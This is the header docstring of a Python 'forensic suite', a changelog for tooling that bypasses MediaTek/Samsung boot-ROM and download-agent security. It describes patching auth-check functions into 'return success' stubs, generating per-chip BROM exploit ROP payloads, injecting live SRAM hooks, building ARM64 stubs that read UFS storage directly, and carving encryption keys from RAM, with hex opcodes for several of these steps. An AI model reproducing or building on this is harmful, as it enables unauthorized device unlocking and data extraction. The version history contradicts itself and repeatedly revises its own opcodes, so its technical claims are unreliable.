#!/usr/bin/env python3
"""
OmniMTK Forensic Suite v13.2 — THE HYPERVISOR REFINEMENT UPDATE
═══════════════════════════════════════════════════════════════════════════
v13.2 REFINEMENT PASS (3 deep-OS nuances on top of v13.1):
──────────────────────────────────────────────────────────────────────────
v13.2-FIX-01: Pipe / Stream Resilience for _get_real_size
        v13.1's lseek-based helper crashed on non-seekable fds
        (/dev/null, stdin pipes, FIFOs, sockets) with
        OSError(EINVAL/ESPIPE) — "Illegal seek". v13.2 catches that
        inside the helper and falls back to os.fstat(fd).st_size,
        which always succeeds on any POSIX/Windows fd. lseek is
        still tried FIRST so block-device sizing keeps working.

v13.2-FIX-02: MMIO Limit Tuning (256 → 2048 pages)
        Red-team audit showed legitimate Samsung Keymaster TAs
        allocate 4–8 MB of heap during init, tripping v13.1's
        1 MB cap as a false-positive "bomb" and aborting valid
        extractions. MMIO_ALLOC_LIMIT raised to 2048 (8 MB), still
        well below the threshold needed to trigger an OOM-kill on
        any developer or CI host.

v13.2-FIX-03: Unicorn Circular-Reference Memory Leak
        Every uc.hook_add() returns a hook handle id; v13.1
        discarded those, so the cycle (uc ⇄ hook_closure) lived on
        until Python's cyclic GC happened to run — 50 sequential
        scans in the GUI leaked ~50 dead Uc instances. v13.2
        captures the returned ids in `hook_ids`, the whole
        emulator-using block runs inside a try/finally, and the
        finally iterates `mu.hook_del(_hid)` for every handle
        before `del mu` + an eager `gc.collect()` reclaims the
        cycle in the same stack frame.

═══════════════════════════════════════════════════════════════════════════
OmniMTK Forensic Suite v13.1 — THE SILICON MASTER-KEY UPDATE
═══════════════════════════════════════════════════════════════════════════
v13.1 HARDENING PASS (3 fortifications over v13.0):
──────────────────────────────────────────────────────────────────────────
v13.1-FIX-01: Block Device Real-Size Mmap (fstat() trap bypass)
        Replaced every `mmap.mmap(fd, 0, ...)` site with
        `mmap.mmap(fd, _get_real_size(fd), ...)`. The new helper
        uses os.lseek(SEEK_CUR → SEEK_END → restore) to ask the
        kernel for the true end-of-stream offset of block devices
        like /dev/sdb or Windows PhysicalDrive paths (where
        fstat() lies and returns 0). Live physical drives now
        map correctly.

v13.1-FIX-02: HashWorker ZeroDivisionError Death Trap
        HashWorker.run() now derives total_size via
        _get_real_size(f.fileno()) inside the open block, then
        emits 100% cleanly when total_size is genuinely 0. No more
        silent thread death + frozen GUI on block-device hashing.

v13.1-FIX-03: Shadow TEE OOM Suicide (MMIO Mapping Bomb)
        ShadowTEE_Engine._mmio_mock_hook now enforces a hard
        MMIO_ALLOC_LIMIT dummy 4KB pages ceiling (v13.1=256/1 MB,
        v13.2-tuned=2048/8 MB — see v13.2-FIX-02). Beyond that, it
        logs "MMIO Allocation Bomb Detected", stops the emulator,
        and returns False so Unicorn aborts instead of mapping
        gigabytes of host RAM until the OS OOM-killer reaps the
        entire OmniMTK process.

═══════════════════════════════════════════════════════════════════════════
OmniMTK Forensic Suite v13.0 — THE FUTURE-PROOF CONVERGENCE UPDATE
═══════════════════════════════════════════════════════════════════════════
✅ v9.0 Base: Samsung Knox/TEEGRIS · SOC_ID · F2FS FBE · 300+ Chips
✅ NEW — MetadataPartitionAnalyzer : Parse metadata.img vold/fscrypt headers
✅ NEW — KeyRefugeAnalyzer         : Samsung keyrefuge.bin entropy + AES-GCM
✅ NEW — TEEImageAnalyzer          : TEEGRIS/Kinibi image · TA headers · version
✅ NEW — SecPartitionAnalyzerV2    : struct-precise SEC binary extraction
✅ NEW — BinarySectorAnalysisTab   : PyQt6 Hex/Offset forensic console

═══════════════════════════════════════════════════════════════════
v9.6 UPGRADES — TZASC HARDWARE REALITY ENGINE:
──────────────────────────────────────────────────────────────────
UPG-01: MetadataPartitionAnalyzer — Deep-scan across full file at
        4096-byte sector boundaries when okme magic not at offset 0.
        Detects 0.0-entropy files as HARDWARE_WIPED_OR_PROTECTED.

UPG-02: KeyRefugeAnalyzer — Detects TZASC_HARDWARE_READ_PROTECTED
        when overall entropy ≈ 0.0 (zeroed or 0xFF buffer from BROM
        read-protection). Full forensic advisory generated.

UPG-03: TEEImageAnalyzer — UUID-based TA scanner for TEEGRIS/Trustonic
        standard Keymaster/Weaver/Gatekeeper UUIDs. Falls back to
        largest-payload candidate if string match fails.

NEW-01: TZASCBypassEngine — 3 alternative extraction paths auto-
        generated when TZASC block is detected:
          Path 1 (RamDumpCarver): Sliding-window EXT_RAM scanner for
                 fscrypt_key structs, session keys, Weaver tokens.
          Path 2 (UFS HCI Direct): Raw SCSI Read(10)/Read(16) hex
                 blocks to query UFS Host Controller directly.
          Path 3 (ATF/SMC Hook): lk.bin/tee1.bin SMC handler offset
                 locator for boot-chain key interception.

═══════════════════════════════════════════════════════════════════
v9.7 UPGRADES — WEAPONIZED EXECUTION UPDATE:
──────────────────────────────────────────────────────────────────
UPG-v97-01: Universal mmap — load_binary_file, _carve_ram_file,
        _scan_smc_offsets, and BinarySectorAnalysisTab._load_file
        now use mmap.mmap with ACCESS_READ instead of read_bytes().
        16 GB EXT_RAM.bin opens in milliseconds, zero heap copy.

UPG-v97-02: RamDumpCarver — YARA-style heuristic scanner replaces
        fixed-offset struct layout. Searches for fscrypt mode byte
        (0x01/0x02), then within a 256-byte flexible window locates
        a 64-byte run with Shannon entropy >= 5.5, followed by a size
        field in {16, 32, 64}. Variable padding between elements is
        correctly skipped.

UPG-v97-03: UFS HCI — ARM64 Bare-Metal DA Stub generator replaces
        CDB string output. Generates a ready-to-inject payload_hex
        ARM64 byte array that initialises UFSHCI at 0x112B0000,
        programs the UTRD, and issues SCSI Read(16). Displayed as
        hex for BROM injection.

UPG-v97-04: SMC Hook — Live BROM SRAM patching replaces lk.bin
        re-flash suggestion. After locating the SMC handler offset
        in lk.bin, the engine calculates the actual SRAM load
        address (base 0x00100000 or 0x00110000) and emits an exact
        BROM WRITE32 / CMD_WRITE16 sequence to inject an ARM64 hook
        directly into live SRAM before execution jumps to LK. No
        AVB / lk.bin reflash required or suggested.

═══════════════════════════════════════════════════════════════════
CRITICAL FIXES (Self-Critique Pass):
──────────────────────────────────────────────────────────────────
FIX-01: Binary scanner offset increment inside for-loop was dead code.
        (Python for-loop ignores mutations to loop variable)
        → Replaced with while-loop.

FIX-02: _entropy() used unique-nibble count / 16 — not real entropy.
        → Replaced with proper Shannon entropy over nibble distribution.

FIX-03: mt6789_byte_process() only reversed word-0, inconsistent with
        mt6789_full_process(). Dual-mode now explicit with clear docs.

FIX-04: generate_keys_json() mixed parsing, derivation, and I/O concerns.
        → Separated into: _parse_phase(), _derive_phase(), _build_result()

FIX-05: derive_kmkey() silently returned PLACEHOLDER with no chip context.
        → Now emits chip-aware Samsung vs MTK path warnings.

FIX-06: load_binary_file() appended every 16-byte high-entropy block as a
        candidate without deduplication, creating thousands of false entries.
        → Deduplicated with a seen-set, capped at 50 candidates.

FIX-07: sanitize_meid() accepted silently truncated strings > 32 chars.
        → Now raises ValueError with context if truncation alters meaning.

FIX-08: Samsung log patterns (Pandora/UFI Samsung logs) used different
        ME_ID format: "ME_ID =  0x..., 0x..." with extra space after =
        → Added dedicated Samsung BROM pattern.

FIX-v97-09: _carve_ram_file used fixed window[4:68] slice — fails
        against scattered/fragmented kernel RAM layouts where padding
        bytes exist between mode and key fields.
        → Replaced with YARA-style flexible-window heuristic search.

FIX-v97-10: _path2_ufs_hci emitted CDB hex strings with no execution
        path — no mechanism to run them inside BROM context.
        → Now generates injectable ARM64 DA stub payload_hex.

FIX-v97-11: _path3_smc_hook suggested re-flashing lk.bin which
        triggers AVB verification failure (device brick on TEEGRIS
        + AVB 2.0). → Now generates BROM WRITE32/CMD_WRITE16 live
        SRAM injection sequence. No lk.bin modification involved.

═══════════════════════════════════════════════════════════════════
v9.8 UPGRADES — THE STABILITY & COHERENCY UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v98-01: load_binary_file froze GUI on 16GB dumps by decoding the
        ENTIRE binary to UTF-8 strings. → For files >100MB, only
        the first and last 10MB are scanned for strings. Massive
        partitions (userdata/EXT_RAM/system/vendor) skip string
        extraction entirely. High-entropy block scanner now calls
        QApplication.processEvents() every 128 iterations.

FIX-v98-02: _loaded_partitions.clear() left zombie mmap handles and
        locked files on Windows. → _cleanup_partitions() explicitly
        calls .close() on every mmap object and every tracked file
        handle BEFORE clearing the dictionaries.

FIX-v98-03: _path2_ufs_hci ARM64 stub wrote directly to DRAM without
        cache maintenance. Added absolute advisory: BROM must issue
        DC CVAU + IC IVAU (or DCCISW) on stub and UTRD/PRDT buffers
        BEFORE jumping to the injected payload, or stale cache lines
        will crash the BROM session.

FIX-v98-04: _carve_ram_file searched for size in [16,512], yielding
        millions of false positives in 16GB dumps. → Size field now
        strictly whitelisted to EXACTLY 16, 32, or 64. Structural
        pre-check added: before computing costly Shannon entropy on a
        64-byte chunk, verify that a valid exact size field exists in
        the plausible key+padding region ahead.

═══════════════════════════════════════════════════════════════════
v9.9 UPGRADES — THE HARDWARE PRECISION UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v99-01: _path2_ufs_hci ARM64 stub FAILED to build the Physical
        Region Description Table (PRDT) inside the UCD. The UFSHCI
        DMA engine had no valid destination, causing SoC hang. → Stub
        now writes PRDT[0] at UCD+0x80: DataByteCount=4095 (Size-1),
        Reserved=0, DataBaseAddress=PRDT_PHYS (0x44020000), Hi=0.

FIX-v99-02: _find_size_field accepted any size 16/32/64 even when
        garbage bytes existed between key end and size field. → Added
        strict Zero-Padding Rule: every byte between key_end and
        size_off MUST be 0x00; otherwise candidate is rejected.

FIX-v99-03: TZASCBypassEngine methods redundantly re-opened files
        with open()+mmap even though the GUI already holds them in
        self._loaded_partitions. → All I/O removed from _carve_ram_file,
        _scan_smc_offsets, _path1_ram_carver, _path3_smc_hook. They now
        accept already-mapped bytes/mmap objects directly.

FIX-v99-04: _path3_smc_hook hardcoded SRAM_BASE to 0x00110000. →
        Now extracts actual load address from lk.bin MTK header
        (MMM or BOOTLOADER! magic) dynamically. If header is missing,
        falls back to chip-id heuristic with a MASSIVE WARNING that
        the analyst MUST verify the base using a scatter file.

═══════════════════════════════════════════════════════════════════
v10.0 UPGRADES — THE ARSENAL & EMULATION UPDATE:
──────────────────────────────────────────────────────────────────
NEW-v100-01: OmniMTK_Weaponizer master module added:
        • DAPatcherEngine — Lightweight hex-pattern scanner that
          locates SLA/verify_auth functions inside MTK DA binaries
          and injects ARM32 THUMB (00 20 70 47) or ARM64
          (00 00 80 D2 C0 03 5F D6) "return True/Success" stubs.
        • PayloadSynthesizer — Dynamic ROP-Chain generator that
          builds per-hw_code BROM exploit payloads instead of
          static kamakiri bins. Uses SRAM maps and security
          register offsets database (MT65xx → MT69xx).
        • MicroEmulator_TEE — Unicorn Engine integration that
          loads lk.bin into emulated ARM64 TrustZone context,
          maps virtual SRAM, sets PC to entry point, and traps
          SMC instructions via UC_HOOK_INSN. Halts at first SMC
          and auto-generates Live SRAM Hooking patch.

NEW-v100-02: ArsenalTab — Red-themed PyQt6 tab:
        • "Patch DA" button with thread-safe worker.
        • "Synthesize BROM Payload" button with hw_code selector.
        • "Emulate LK.bin" button with register-dump output.

FIX-v100-03: Added unicorn to requirements.txt (optional).
        If unicorn is unavailable, MicroEmulator_TEE degrades
        gracefully to static SMC scan fallback.

═══════════════════════════════════════════════════════════════════
v10.1 UPGRADES — THE SILICON REALITY UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v101-01: DAPatcherEngine XREF hallucination fixed.
        v10.0 walked backward from string offset in .rodata directly
        to .text prologue — physically impossible. v10.1 implements
        real XREF resolution:
          • Phase A: Locate SLA/auth strings in binary.
          • Phase B: Search ENTIRE binary for 32-bit LE pointers to
            string offset (ARM32 literal pools, ARM64 abs pointers).
          • Phase C: For ARM64, decode ADRP+ADD/LDR pairs that point
            to the string page. Pure-Python decoder for immlo/immhi.
          • Phase D: Only AFTER locating the xref instruction in .text,
            walk backward to find STP / PUSH prologue.

FIX-v101-02: PayloadSynthesizer actually writes to security register.
        v10.0 loaded X2=0 but FORGOT the STR instruction. v10.1 adds
        explicit MOVZ/MOVK sequence to load sec_reg (e.g. 0x1000A000)
        into X4, then STR W2, [X4] to clear the SBC/DAA disable bit.
        ARM32 THUMB payload also updated with LDR R4, =sec_reg + STR.

FIX-v101-03: MicroEmulator_TEE header bypass.
        v10.0 set PC to sram_base and crashed on ASCII MTK header
        (MMM / BOOTLOADER!). v10.1 parses MTK headers properly:
          • LK Image (magic 0x58881688): loadaddr at offset 40.
          • GFH (MMM): load_addr at offset 4, entry_point at offset 8.
          • NAND (BOOTLOADER!): load_addr at offset 16, entry at 20.
          • Generic (EMMC_BOOT/UFS_BOOT): searches GFH in first 2KB.
          • No header: scans for first valid ARM64 NOP/STP/SUB.
        PC is set strictly to Entry Point, not to header start.

═══════════════════════════════════════════════════════════════════
v10.2 UPGRADES — THE HARDWARE PIPELINE UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v102-01: Unicorn Emulation Alignment & Peripheral Panic.
        v10.1 called mu.mem_map(load_addr, sram_size) with an unaligned
        address (e.g. 0x44200100) → instant UC_ERR_ARG crash.
        v10.2 enforces strict 4KB alignment:
          • mapped_addr = load_addr & ~0xFFF
          • write_offset = load_addr - mapped_addr
          • mapped_size  = ceil(sram_size + write_offset) to 4KB.
        v10.2 also adds UC_HOOK_MEM_READ_UNMAPPED and
        UC_HOOK_MEM_WRITE_UNMAPPED hooks that dynamically allocate
        4KB dummy pages on-the-fly. LK can now poke PMIC, UART,
        and GPIO registers without crashing until the SMC trap.

FIX-v102-02: Payload Memory Synchronization (Out-of-Order Fix).
        v10.1 wrote to the security register via STR but the BROM
        continued immediately while the write was still buffered in
        the store queue. The peripheral bus never saw the update.
        v10.2 inserts DSB SY + ISB immediately after STR W2,[X4]:
          • DSB SY  → 0xD503309F (LE: 9F 30 03 D5)
            Data Synchronization Barrier — flushes store buffer.
          • ISB     → 0xD50330DF (LE: DF 30 03 D5)
            Instruction Synchronization Barrier — flushes pipeline.
        This guarantees the write hits the physical bus before RET.

FIX-v102-03: VMA vs File Offset Illusion in DA Patcher.
        v10.1 decoded ADRP using raw file offset as PC. ADRP computes
        target = (PC & ~0xFFF) + (imm << 12). The PC is a VIRTUAL
        MEMORY ADDRESS at runtime, NOT the file index.
        v10.2 extracts the ELF load base from PT_LOAD segments
        (lowest p_vaddr) or falls back to 0x00200000 for raw DA.
        The ADRP decoder now receives v_pc = base_addr + offset,
        and xref scans use v_str = base_addr + str_offset.

═══════════════════════════════════════════════════════════════════
v10.3 UPGRADES — THE SILICON ARCHITECTURE UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v103-01: Fatal MMIO Bus Fault (PayloadSynthesizer).
        v10.2 did not include UFSHCI bring-up logic, but any future
        or embedded STR Xn (64-bit store) to a 32-bit APB/AHB MMIO
        register triggers an immediate Synchronous External Abort.
        ARMv8-A reference: Data Abort with EC=0x25 (External Abort).
        v10.3 enforces STR Wn (32-bit) for ALL MMIO writes.
        For 64-bit UFSHCI registers (e.g. UTRLBA @ 0x50), the write
        is SPLIT: lower 32-bits to 0x50 via STR Wn, upper 32-bits
        to 0x54 via STR Wn.  Hex opcodes reflect this strictly.

FIX-v103-02: Unicorn Stack Collision (MicroEmulator_TEE).
        v10.2 calculated stack_base = load_addr - 0x10000, placing
        the stack adjacent to SRAM. On low load_addr (e.g. 0x00100000)
        this underflows into BootROM or collides with GIC/PMIC MMIO.
        v10.3 maps the stack at an isolated high virtual address
        (0x80000000) with no relation to load_addr. SP = 0x8000FF00.

FIX-v103-03: DA Container Illusion (DAPatcherEngine).
        v10.2 checked data[:4] == b"\x7fELF". Real MTK_AllInOne_DA
        files are containers with a TOC header at offset 0 and one
        or more ELF payloads embedded deeper in the binary. v10.3
        implements a full-file scanner for ELF magic (\x7fELF) and
        validates e_machine (ARM=0x28 / AARCH64=0xB7). The first
        valid embedded ELF is used to extract architecture and
        p_vaddr load base for correct ADRP VMA decoding.

═══════════════════════════════════════════════════════════════════
v10.4 UPGRADES — THE ABSOLUTE PRECISION UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v104-01: VMA Desynchronization in DAPatcherEngine.
        v10.3 found the embedded ELF offset inside the container but
        then passed the RAW, UNSLICED container to _scan_auth_strings
        and _find_all_xrefs.  str_off was an absolute file offset,
        NOT an ELF-relative offset.  The ADRP target calculation
        v_str = base_addr + str_off therefore added the container
        prefix offset TWICE, producing hallucinated VMAs that never
        matched any real ADRP page.  v10.4 slices elf_data =
        data[elf_offset:] and passes ONLY elf_data to all scanning
        and patching functions.  Patches are applied to mutable_elf,
        then the final binary is reconstructed as:
          data[:elf_offset] + bytes(mutable_elf).
        This guarantees every offset used in XREF resolution is
        strictly ELF-relative while the final patch lands at the
        correct absolute file position.

FIX-v104-02: ACTUAL Fatal MMIO Bus Fault in _path2_ufs_hci.
        v10.3 applied the 32-bit STR Wn fix to the WRONG function
        (_build_arm64_payload) and left _path2_ufs_hci completely
        untouched, filled with _str_reg_imm (64-bit STR Xn) calls
        targeting UFSHCI MMIO registers (UTRLBA 0x50, UTRLBAU 0x54,
        UTRLDBR 0x58, UTRLRSR 0x60).  Any execution of these stores
        triggers an immediate Synchronous External Abort on the MTK
        APB/AHB bus.  v10.4 rewrites Part B of _path2_ufs_hci to use
        ONLY _str_w_reg_imm (32-bit STR Wn) for ALL UFSHCI MMIO.
        The 64-bit UTRLBA register is split into two 32-bit writes:
          • STR W1, [X0, #0x50]  → lower 32 bits of UTRD address.
          • STR WZR, [X0, #0x54] → upper 32 bits (UTRLBAU) = 0.
        All doorbell and run/stop registers are now strictly 32-bit.

═══════════════════════════════════════════════════════════════════
v10.5 UPGRADES — THE JEDEC PROTOCOL UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v105-01: UTRD Header DW0 JEDEC Encoding.
        v10.4 wrote 0x0900 to DW0 of the UTRD descriptor.  Per JEDEC
        UFSHCI spec §7.1.1, for a SCSI Read (Device→Host) the Command
        Type (CT, bits 31:28) must be 1 (UFS Storage Command) and the
        Data Direction (DD, bits 26:25) must be 2 (Device to Host).
        Encoded DW0 = (1 << 28) | (2 << 25) = 0x14000000.
        v10.5 loads 0x14000000 into W4 via MOVZ + MOVK and stores it
        with STR W4, [X3, #0x00].  This aligns the DMA engine with the
        host controller expectation and prevents UTP-layer timeouts.

FIX-v105-02: HCE (Host Controller Enable) Toggle.
        Writing 0 to UTRLDBR (0x58) is an advisory clear and does NOT
        guarantee a hardware reset of the doorbell state machine on
        cold boot.  JEDEC UFSHCI spec §5.2 mandates that the Host
        Controller Enable register (HCE, offset 0x34) be toggled
        (0 → 1) after power-on to place the controller in a known
        operational state before any Transfer List programming.
        v10.5 inserts the HCE sequence in Part B immediately after
        loading UFSHCI_BASE into X0:
          • STR WZR, [X0, #0x34]  → HCE = 0 (disable)
          • MOVZ W2, #1
          • STR W2, [X0, #0x34]   → HCE = 1 (enable)
        Only after the controller is enabled do we programme UTRLBA
        and ring the doorbell.

═══════════════════════════════════════════════════════════════════
v10.6 UPGRADES — THE DMA COHERENCY & POLLING UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v106-01: HCE Hardware Polling (Link Training Wait).
        Writing 1 to HCE (0x34) initiates the UFS controller wake-up
        sequence including M-PHY link training, which is NOT
        instantaneous.  v10.5 executed the next instruction
        immediately, potentially programming Transfer List registers
        while the controller was still offline.  v10.6 inserts a
        tight ARM64 polling loop right after the HCE write:
          poll_loop:
            LDR W3, [X0, #0x34]
            CMP W3, #1
            B.NE poll_loop
        Hex encoding: B9403403 7100047F 54FFFFC1 (LE).
        The CPU now blocks until the hardware explicitly reports
        HCE == 1, guaranteeing the controller is fully online.

FIX-v106-02: DMA Cache Coherency (DC CIVAC Flush).
        The ARM64 CPU writes UTRD + UCD + PRDT structures into
        L1/L2 cache.  The UFS DMA engine reads from Physical RAM.
        Without explicit cache maintenance, the DMA controller sees
        stale (pre-modified) cache lines and hangs indefinitely.
        v10.6 inserts `DC CIVAC, X3` (SYS #3, C7, C14, #1, X3)
        immediately before ringing the UTRLDBR doorbell (0x58),
        followed by `DSB SY` to ensure completion.  This flushes
        the descriptor payload to main memory so the DMA engine
        reads the actual JEDEC commands we crafted.
        Hex encoding: 237E03D5 (DC CIVAC, X3) + 9F3003D5 (DSB SY).

═══════════════════════════════════════════════════════════════════
v10.7 UPGRADES — THE RESILIENT ARCHITECTURE UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v107-01: Infinite Polling Deadlock (HCE Timeout Loop).
        v10.6 used a tight unconditional B.NE poll_loop after writing
        1 to HCE (0x34).  If the UFS chip is physically damaged, the
        M-PHY link never comes up, and HCE never reads back as 1.
        The CPU spins forever, permanently freezing the MTK SoC with
        no recovery path.  v10.7 introduces a Timeout Counter:
          • MOVZ/MOVK X5 = 0xFFFFF (1,048,575 iterations)
          • Inside the loop: LDR W3, [X0, #0x34]; CMP W3, #1;
            B.EQ hce_done (success — break out); SUB W5, W5, #1;
            CBNZ W5, poll_loop (decrement and retry)
        If W5 reaches 0, the loop exits safely instead of hanging.
        Hex: D29FFFE5 + F2A001E5 + B9403403 + 7100047F + 54000040
             + 510004A5 + B5FFF805.

FIX-v107-02: Single Cache-Line Illusion (Range Flush).
        v10.6 issued a single `DC CIVAC, X3` which only flushes the
        first 64-byte cache line.  The UTRD+UCD+PRDT structure spans
        well over 256 bytes (4 cache lines on ARM64).  The UFS DMA
        engine reads valid UTRD headers but STALE garbage for UCD and
        PRDT, triggering a fatal UFS bus error (SError).
        v10.7 unrolls the flush across 4 consecutive cache lines:
          • DC CIVAC, X3       → 237E03D5  (line 0: bytes 0-63)
          • ADD X6, X3, #64    → 66011091  (line 1: bytes 64-127)
          • DC CIVAC, X6       → 267E03D5
          • ADD X6, X6, #64    → C6011091  (line 2: bytes 128-191)
          • DC CIVAC, X6       → 267E03D5
          • ADD X6, X6, #64    → C6011091  (line 3: bytes 192-255)
          • DC CIVAC, X6       → 267E03D5
          • DSB SY             → 9F3003D5  (completion barrier)
        The entire descriptor payload is now visible to DMA.

═══════════════════════════════════════════════════════════════════
v10.8 UPGRADES — THE DMA SYNCHRONIZATION UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v108-01: Timeout Fall-Through Abort on Dead Link.
        v10.7's HCE timeout loop fell through to programming dead UFS
        hardware when the counter reached zero, causing undefined MMIO
        behaviour and potential bus lockup.  v10.8 introduces a hard
        forward branch to a dedicated abort handler:
          • B abort_dead_link  → 26000014  (forward +38 inst)
          • abort_dead_link writes 0xDEAD to [X3, #0x100] and BRK #0.
        The polling LDR now targets X12 instead of X3, preserving
        UTRD_PHYS in X3 for the abort marker store.
        CBNZ hex corrected from 85F8FF5A to 05F8FFB5 (standard ARM64).

FIX-v108-02: Doorbell Completion Polling (Hit-and-Run DMA Fix).
        After ringing UTRLDBR, the CPU previously executed BRK #0
        immediately while the UFS DMA was still mid-transfer.  This
        extracted empty/stale RAM.  v10.8 inserts a second timeout loop
        that polls [X0, #0x58] until bit 0 clears to 0 (hardware ack):
          • MOVZ/MOVK X7 = 0xFFFFF
          • db_poll_loop: LDR W12, [X0, #0x58]; CMP W12, #0;
            B.EQ db_done; SUB W7, W7, #1; CBNZ X7, db_poll_loop
          • B abort_dead_link on timeout  → 0E000014  (forward +14 inst)
        The CPU now waits for DMA completion before proceeding.

FIX-v108-03: Post-DMA Cache Invalidation (DC IVAC Range Flush).
        After DMA writes fresh key sector data to PRDT_PHYS, the CPU
        L1 cache still holds pre-DMA stale lines.  DC CIVAC would
        write-back those stale lines, CORRUPTING the extracted keys.
        v10.8 issues DC IVAC (invalidate only) across 4 cache lines:
          • DC IVAC, X6  → 267608D5  (SYS #0, C7, C6, #1, X6)
          • ADD X6, X6, #64  four times to cover 256 bytes
          • DSB SY  → 9F3003D5
        This forces the CPU to fetch fresh data from physical RAM.
        All legacy DC CIVAC hex opcodes corrected from 237E03D5 to
        the standard 237E0BD5 (sys_insn Op0=01).

═══════════════════════════════════════════════════════════════════
v11.2 UPGRADES — THE CRYPTOGRAPHIC REALITY UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v112-01: Android FBE Decryptor v2 ioctl Inline Python Script.
        v11.1 relied exclusively on keyctl add logon for fscrypt key
        injection. Modern Android 10+ FBE v2 kernels deprecate this
        approach in favour of FS_IOC_ADD_ENCRYPTION_KEY ioctl.
        v11.2 generates an inline Python script (embedded inside the
        bash one-liner via heredoc) that attempts fcntl.ioctl FIRST
        with struct-packed fscrypt_add_key_arg (HEADER=80 bytes,
        type=2 FSCRYPT_KEY_SPEC_TYPE_IDENTIFIER), then falls back to
        keyctl for legacy FBE v1 / compatibility. The Python script
        tries multiple ioctl size encodings for kernel compatibility
        (size=80 exact, then size=0 fallback).

FIX-v112-02: Metadata Decryption Order Enforcement.
        v11.1 used mapper name omnimtk_meta which was ambiguous.
        v11.2 renames to omnimtk_userdata_dec and explicitly documents
        the strict sequence: losetup → cryptsetup → mount mapper.
        When metadata_key_hex is absent, the loop device is mounted
        directly with a clear warning about plaintext superblock.

FIX-v112-03: Key Injection AFTER Mount.
        v11.1 injected keys before mount (keyctl operates on keyring).
        v11.2 injects keys AFTER mount because FS_IOC_ADD_ENCRYPTION_KEY
        is an ioctl on the mounted filesystem directory descriptor.
        This ordering is critical for FBE v2 correctness.

═══════════════════════════════════════════════════════════════════
v11.3 UPGRADES — THE FORENSIC FORTIFICATION UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v113-01: Forensic Mount Flags (disable_roll_forward).
        v11.2 mounted F2FS with ro,noload only. v11.3 adds the
        disable_roll_forward flag which prevents the kernel from
        replaying the journal or rolling forward the checkpoint,
        thereby guaranteeing ZERO writes to the evidence image.
        If the running kernel does not recognise this option,
        the generated script prints a warning and falls back to
        ro,noload automatically, preserving workflow continuity.

FIX-v113-02: FBE v3 / Hardware-Wrapped Keys Labelling.
        Added explicit [RESEARCH / SIMULATION MODE ONLY] markers
        to all FBE v3 documentation. Clarified that hardware-wrapped
        CE/DE keys (Exynos 2100+, Snapdragon 888+) require TrustZone
        emulation via the MicroEmulator engine and are OUTSIDE the
        scope of standard offline mount+ioctl decryption.

FIX-v113-03: Sandbox Test Hardening (Regex Validation).
        Replaced brittle exact-string assertions in Tests 21-22 with
        regular-expression validation that checks the logical
        structure of the inline Python script and ioctl computation,
        making the test suite resilient to whitespace or comment
        variations.

═══════════════════════════════════════════════════════════════════
v11.3 UPGRADES — THE STRUCTURAL INTEGRITY & OPSEC UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v113-04: Forensic OpSec — No Disk Writes for CE/DE Keys.
        v11.2 wrote the inline Python key injector to /tmp/omnimtk_fbe_inject.py
        which left a recoverable disk trace of raw encryption keys.
        v11.3 pipes the script directly to python3 via stdin heredoc
        (python3 - << 'OMNIMTK_PYEOF'), ensuring keys remain in RAM
        only and never touch the workstation's filesystem.

FIX-v113-05: Async RAM Carving Worker (QThread + Signal Safety).
        v11.2 ran _carve_ram_file on the main GUI thread, freezing
        the interface for minutes on multi-GB EXT_RAM dumps. Passing
        large mmap objects across pyqtSignal boundaries could trigger
        segmentation faults. v11.3 introduces RamCarveWorker(QThread)
        which receives ONLY the file path (not mmap objects), opens
        its own internal mmap, runs the scan, and emits serialisable
        results (list of dicts) via pyqtSignal. All load buttons are
        atomically disabled during worker execution to prevent race
        conditions from concurrent analyses.

FIX-v113-06: MTK TOC Parsing (Structured over Blind Search).
        v11.2 used a blind linear search for \x7fELF across the entire
        MTK_AllInOne_DA container, which could find the wrong ELF image
        or fail on packed containers. v11.3 adds _parse_mtk_toc() which
        recognises the 'MTK_DOWNLOAD_AGENT' magic header and reads the
        Table of Contents to extract the exact ELF image offset. The
        legacy blind search remains as an emergency fallback only.

FIX-v113-07: Root EUID Enforcement in Generated Bash Scripts.
        v11.2 scripts could fail mid-execution if run without sudo,
        leaving loop devices and dm-crypt mappers dangling. v11.3
        inserts a strict EUID check immediately after set -euo pipefail:
        'if [ "$EUID" -ne 0 ]; then echo "[FAIL] Please run as root"; exit 1; fi'
        This guarantees clean failure BEFORE any resources are allocated.

──────────────────────────────────────────────────────────────────
v11.1 UPGRADES — THE CRYPTO-EXECUTION UPDATE:
──────────────────────────────────────────────────────────────────
FIX-v110-01: HCE Store Buffer Race Condition (DSB SY Post-Toggle).
        v10.9 toggled HCE 0→1 via STR W2,[X0,#0x34] then immediately
        entered the polling loop without a completion barrier. On
        out-of-order ARM64 cores the STR can sit in the store buffer
        while the LDR in the loop reads the old value (0), causing a
        false timeout and abort on a perfectly healthy UFS link.
        v11.2 inserts DSB SY (9F3003D5) after the HCE=1 write, ensuring
        the toggle hits the MMIO register before any LDR observes it.

FIX-v110-02: DAPatcherEngine Malformed ELF Resilience.
        v10.9's _extract_elf_base used naked struct.unpack_from calls
        without exception handling. A corrupted MTK_AllInOne_DA
        container with an ELF header claiming e_phoff=0xFFFFFFFF or
        e_phnum=0xFFFF would trigger struct.error and crash the entire
        Python interpreter, bricking the forensic session.
        v11.2 wraps every struct.unpack_from in try/except, adds a
        Zero-Base ELF Guard (rejects min_base==0 PIE binaries), and
        validates e_phnum against a sane maximum (256). If any check
        fails, the engine falls back to 0x00200000 with a WARNING.
        _find_all_xrefs is similarly hardened against struct.error
        and negative scan limits.

FIX-v110-03: _carve_ram_file O(n²) Padding Scan Elimination.
        v10.9's Zero-Padding Rule used `any(data[...]!=0x00 for i in
        range(s))` inside a hot loop, resulting in O(n²) byte reads
        on large RAM dumps. On a 16 GB EXT_RAM.bin with scattered
        mode-byte false positives, the scanner could freeze for
        minutes. v11.2 replaces the generator with a vectorised
        `memoryview.find(b'\x00'*s)` pre-check and a fast `sum(mv)`
        zero-region test. Scanning throughput is increased by >10x
        while maintaining the exact same forensic accuracy.
